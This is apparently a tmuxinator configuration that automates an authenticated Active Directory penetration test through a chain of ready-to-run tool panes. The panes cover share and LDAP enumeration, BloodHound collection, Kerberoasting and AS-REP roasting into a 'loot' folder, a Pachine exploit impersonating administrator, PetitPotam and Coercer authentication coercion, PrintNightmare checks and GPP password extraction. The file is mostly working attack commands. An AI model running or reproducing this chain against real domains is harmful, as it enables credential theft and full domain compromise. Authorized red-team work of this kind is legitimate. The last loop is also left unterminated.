name: authd
root: /RSM/

#Notes
#   - find a way to make an option to auto-run vs prefill

# Variables/Defaults are set here
<%
  @settings["prefill"] ||= "python3 /RSM/mux/prefillTest.py"
  @settings["domain"] ||= "domain.local"
  @settings["user"] ||= "user" #modify this value before running config
  @settings["pass"] ||= "thisisatestdefaultpasswordCHECK" #modify this value before running config
  @settings["nomadPass"] ||= "nomadPass"
  @settings["msfWorkspace"] ||= "newClient" #this must be unique to avoid potential conflict with prior testers
  @settings["rootDir"] ||= "/RSM"
  ### example of starting project with arguments: tmuxinator start internalTemplate domain=domain.local user=Sally pass="s8g9h3J##"
%>

on_project_start: if [ "<%= @settings['pass'] %>" = "thisisatestdefaultpasswordCHECK" ]; then echo 'Default password is still set in config file.\nEnsure your username and password are written (and saved) to the config file!\n'; fi; mkdir -p /opt/nomad-tools <%= @settings["rootDir"] %>/loot
pre_window: if [ "<%= @settings['pass'] %>" = "thisisatestdefaultpasswordCHECK" ]; then tmux kill-session -t authd; fi

# create and cd into client/testing folder before running
windows:
  - SMB: 
      panes:
        - cme:
          - tmux select-pane -T 'SMB shares' -t "authd:SMB.0"
          - mkdir -p <%= @settings["rootDir"] %>/scans/masscanPortList/smb; cd <%= @settings["rootDir"] %>/scans/masscanPortList/smb
          - crackmapexec smb <%= @settings["rootDir"] %>/scans/masscanPortList/smb.lst --shares -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' | tee <%= @settings["rootDir"] %>/scans/masscanPortList/smb/cme-<%= @settings["user"] %>-shares.txt
        - smbmap:
          - tmux select-pane -T 'smbmap' -t "authd:SMB.1"
          - <%= @settings["prefill"] %> "smbmap -H smbIP -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -r"; clear
        - dumpsterdiver:
          - tmux select-pane -T 'dumpsterdiver' -t "authd:SMB.2"
          - cd /opt/nomad-tools/DumpsterDiver || git clone https://github.com/securing/DumpsterDiver.git /opt/nomad-tools/DumpsterDiver && cd /opt/nomad-tools/DumpsterDiver && pipenv install
          - pipenv run python3 DumpsterDiver.py --help
  - LDAP: 
      pre: mkdir -p <%= @settings["rootDir"] %>/loot/ldap-domaindump <%= @settings["rootDir"] %>/scans/ldap 
      panes:
        - ldapdomaindump:
          - tmux select-pane -T 'ldapdomaindump' -t "authd:LDAP.0"
          - mkdir -p <%= @settings["rootDir"] %>/loot/ldap-domaindump && cd <%= @settings["rootDir"] %>/loot/ldap-domaindump
          - ldapdomaindump -u '<%= @settings["domain"] %>\<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1)
        - getADusers:
          - tmux select-pane -T 'getADusers' -t "authd:LDAP.1"
          - GetADUsers.py -all '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>' -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) | tee <%= @settings["rootDir"] %>/scans/ldap/getADUsers.txt
        - ldap signing:
          - tmux select-pane -T 'ldap signing' -t "authd:LDAP.2"
          - cd /opt/nomad-tools/LdapRelayScan || (git clone https://github.com/zyn3rgy/LdapRelayScan.git /opt/nomad-tools/LdapRelayScan && cd /opt/nomad-tools/LdapRelayScan && echo "git+https://github.com/wbond/oscrypto.git@d5f3437" >> requirements.txt; pipenv run pip install -r requirements.txt --force-reinstall && mkdir -p <%= @settings["rootDir"] %>/scans/ldap && cd /opt/nomad-tools/LdapRelayScan && pipenv install --skip-lock) && cd /opt/nomad-tools/LdapRelayScan; clear
          - pipenv run python3 LdapRelayScan.py -method BOTH -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' | tee <%= @settings["rootDir"] %>/scans/ldap/ldapSigning.txt
        - get user descriptions:
          - tmux select-pane -T 'get user descriptions' -t "authd:LDAP.3"
          - crackmapexec ldap <%= @settings["rootDir"] %>/dcIP.txt -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M get-desc-users | tee <%= @settings["rootDir"] %>/scans/ldap/userDescriptions.txt
        - MAQ:
          - tmux select-pane -T 'MAQ' -t "authd:LDAP.4"
          - crackmapexec ldap $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M MAQ | tee <%= @settings["rootDir"] %>/scans/ldap/MAQ.txt
        - MAQ ~ costa tool check:
          - tmux select-pane -T 'MAQ ~ costa tool check' -t "authd:LDAP.5"
          - cd /opt/nomad-tools/MAQCheck || (git clone https://github.com/sn8k3sec/MAQCheck.git /opt/nomad-tools/MAQCheck && cd /opt/nomad-tools/MAQCheck && pipenv install -r requirements.txt) && cd /opt/nomad-tools/MAQCheck
          - pipenv run python3 maqcheck.py --username '<%= @settings["user"] %>' --password '<%= @settings["pass"] %>' --domain <%= @settings["domain"] %> | tee <%= @settings["rootDir"] %>/scans/ldap/MAQ-costaCheck.txt
        - ldap-checker:
          - tmux select-pane -T 'ldap-checker' -t "authd:LDAP.6"
          - crackmapexec ldap <%= @settings["rootDir"] %>/dcIP.txt -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M ldap-checker | tee <%= @settings["rootDir"] %>/scans/ldap/ldap-checker-cme.txt
  - kerberoasting: 
      pre: mkdir -p <%= @settings["rootDir"] %>/loot/kerberoast
      panes:
        - kerberoasting:
          - tmux select-pane -T 'kerberoasting' -t "authd:kerberoasting.0"
          - mkdir -p <%= @settings["rootDir"] %>/kerberoast
          - GetUserSPNs.py '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>' -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -request -outputfile <%= @settings["rootDir"] %>/kerberoast/kerberoasting.txt
        - delegation:
          - tmux select-pane -T 'delegation' -t "authd:kerberoasting.1"
          - findDelegation.py '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'
  - samTheAdmin: 
      panes:
        - check:
          - tmux select-pane -T 'check' -t "authd:samTheAdmin.0"
          - cd /opt/nomad-tools/Pachine || (git clone https://github.com/ly4k/Pachine.git /opt/nomad-tools/Pachine; cd /opt/nomad-tools/Pachine) && pipenv install && pipenv run python3 -m pip install ldap3 impacket
          - pipenv run python3 pachine.py -dc-host <%= @settings["domain"] %> -scan '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'
        - exploit:
          - tmux select-pane -T 'exploit' -t "authd:samTheAdmin.1"
          - cd /opt/; cd opt/nomad-tools/; cd /opt/nomad-tools/Pachine
          - dcIPandNBName=$(for dc in $(cat /RSM/dcIP.txt); do echo "DC IP:$dc; DC NetBIOS name:$(nbtscan $dc | tail -n 1 | awk '{print $2}')"; done)
          - <%= @settings["prefill"] %> "pipenv run python3 pachine.py -dc-host ADD_NETBIOS_NAME.<%= @settings["domain"] %> -spn cifs/dc.<%= @settings["domain"] %> -impersonate administrator '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>'"; clear; echo -e "\e[0;32mUpdate DC Netbios name\033[0m\n$dcIPandNBName"
  - bloodhound: 
      pre: mkdir -p <%= @settings["rootDir"] %>/loot/bloodhound
      panes:
        - bloodhound:
          - tmux select-pane -T 'bloodhound' -t "authd:bloodhound.0"
          - cd /opt/nomad-tools/BloodHound.py || git clone https://github.com/fox-it/BloodHound.py.git /opt/nomad-tools/BloodHound.py
          - cd <%= @settings["rootDir"] %>/loot/bloodhound
          - python3 /opt/nomad-tools/BloodHound.py/bloodhound.py -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -c all -d <%= @settings["domain"] %>
  - ADCS: 
      pre: mkdir -p <%= @settings["rootDir"] %>/loot/ADCS && cd <%= @settings["rootDir"] %>/loot/ADCS
      panes:
        - cme ADCS:
          - tmux select-pane -T 'cme ADCS' -t "authd:ADCS.0"
          - crackmapexec ldap <%= @settings["rootDir"] %>/dcIP.txt -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M adcs | tee mkdir -p <%= @settings["rootDir"] %>/loot/ADCS/cme-ADCS.txt
        - certipy:
          - tmux select-pane -T 'certipy' -t "authd:ADCS.1"
          - cd /opt/nomad-tools/Certipy-Docker || (git clone https://github.com/secure-77/Certipy-Docker.git /opt/nomad-tools/Certipy-Docker) && cd /opt/nomad-tools/Certipy-Docker
          - docker build -t certipy:latest .
          - docker run -it -v <%= @settings["rootDir"] %>/loot/ADCS:/tmp certipy:latest certipy find -u '<%= @settings["user"] %>@<%= @settings["domain"] %>' -p '<%= @settings["pass"] %>' -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -old-bloodhound -output /tmp/<%= @settings["user"] %> -scheme ldap | tee <%= @settings["rootDir"] %>/loot/ADCS/<%= @settings["user"] %>-certipyTee.txt
  - coercAuth: 
      layout: 786e,113x25,0,0[113x10,0,0,23,113x14,0,11{56x14,0,11,37,56x14,57,11,41}]
      panes:
        - cme petit:
          - tmux select-pane -T 'PetitPotam' -t "authd:coercAuth.0"
          - crackmapexec smb $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M petitpotam | tee <%= @settings["rootDir"] %>/scans/petitpotam.txt
        - PetitPotam.py:
          - tmux select-pane -T 'PetitPotam.py' -t "authd:coercAuth.1"
          - cd /opt/nomad-tools/PetitPotam || git clone https://github.com/topotam/PetitPotam.git /opt/nomad-tools/PetitPotam && cd /opt/nomad-tools/PetitPotam
          - nomadIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
          - python3 PetitPotam.py -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> $nomadIP $(cat /RSM/dcIP.txt | head -n 1)
          - echo "Note eth0 is the default nomadIP used; modify nomadIP as needed"
        - Coercer:
          - tmux select-pane -T 'Coercer' -t "authd:coercAuth.2"
          - cd /opt/nomad-tools/Coercer || (git clone https://github.com/p0dalirius/Coercer.git /opt/nomad-tools/Coercer) && cd /opt/nomad-tools/Coercer && pipenv install
          - nomadIP=$(ip a | grep "eth0" -A 3 | grep -oP "inet .*\/" | grep -oP "[0-9\.]+")
          - pipenv run python3 Coercer.py coerce -l $nomadIP -t $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -v
          - echo "Note eth0 is the default nomadIP used; modify nomadIP as needed"
  - misc: 
      panes:
        - printNightmare:
          - tmux select-pane -T 'printNightmare' -t "authd:misc.0"
          - crackmapexec smb <%= @settings["rootDir"] %>/scans/masscanPortList/smb.lst -M spooler
          - echo <%= @settings['nomadPass'] %> | sudo -S su 
          - cd /opt/nomad-tools/ItWasAllADream || (git clone https://github.com/eversinc34/ItWasAllADream.git /nomad-tools/ItWasAllADream) && cd ItWasAllADream && docker build -t itwasalladream .
          # grab hosts with open RPC ports (often more are found through additional nmap scans, but this can also be modified to use results from masscan)
          - msfconsole -q -x 'workspace-a <%= @settings["msfWorkspace"]  %>; services -u -O 6 -p 111,135,593,2049 -o <%= @settings["rootDir"] %>/scans/masscanPortList/rpcHosts.txt -c name; exit' && cat <%= @settings["rootDir"] %>/scans/masscanPortList/rpcHosts.txt | sed '1d' | cut -d "," -f 1 | tr -d '"' > <%= @settings["rootDir"] %>/scans/masscanPortList/rpcHosts-cleaned.txt
          # create docker container to test printerNightmare
          - for i in $(cat <%= @settings["rootDir"] %>/scans/masscanPortList/rpcHosts-cleaned.txt); do echo testing:$i; sudo docker run -it itwasalladream -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> $i; echo ""; done
        - GPP password:
          - tmux select-pane -T 'GPP password' -t "authd:misc.1"
          - crackmapexec smb <%= @settings["rootDir"] %>/dcIP.txt -u '<%= @settings["user"] %>' -p '<%= @settings["pass"] %>' -d <%= @settings["domain"] %> -M gpp_password | tee <%= @settings["rootDir"] %>/scans/GPPpassword.txt
        - authd ASREProast:
          - tmux select-pane -T 'authd ASREP roast' -t "authd:misc.2"
          - <%= @settings["prefill"] %> 'GetNPUsers.py <%= @settings["domain"] %>/ -dc-ip $(cat <%= @settings["rootDir"] %>/dcIP.txt | head -n 1) -no-pass -usersfile $USERNAMEFILE.txt -outputfile <%= @settings["rootDir"] %>/scans/authd-asrepRoast.txt -format john'; clear
        - webdavScan:
          - tmux select-pane -T 'webdavScan' -t "authd:misc.3"
          - cd  /opt/nomad-tools/WebclientServiceScanner || (git clone https://github.com/Hackndo/WebclientServiceScanner.git  /opt/nomad-tools/WebclientServiceScanner) && cd  /opt/nomad-tools/WebclientServiceScanner
          - echo <%= @settings['nomadPass'] %> | sudo -S su
          - sudo python3 setup.py install
          - for IP in $(cat <%= @settings["rootDir"] %>/ipList.txt); do webclientservicescanner -dc-ip `cat /RSM/dcIP.txt | head -n 1` '<%= @settings["domain"] %>/<%= @settings["user"] %>:<%= @settings["pass"] %>@'$IP
